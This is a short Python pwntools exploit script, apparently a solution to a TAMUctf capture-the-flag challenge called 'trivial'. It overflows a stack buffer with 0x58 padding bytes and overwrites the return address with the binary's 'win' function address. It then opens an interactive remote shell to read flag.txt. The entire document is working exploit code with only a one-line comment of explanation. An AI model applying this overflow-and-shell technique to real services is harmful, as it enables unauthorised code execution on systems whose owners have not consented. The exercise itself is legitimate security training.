#!/usr/bin/env python3

# Simple buffer overflow.  Just call win function and then use remote shell
# to dump out the flag.txt

from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")

#p = process("./trivial")

#p = gdb.debug("./trivial",'''
#        b main
#        run
#        ''')

e = ELF("./trivial")

winAddr = e.symbols["win"]

print("Win addr {}".format(hex(winAddr)))

payload = b'a' * 0x58

payload += p64(winAddr)

p.send(payload)
p.send(b"\n")

p.interactive()
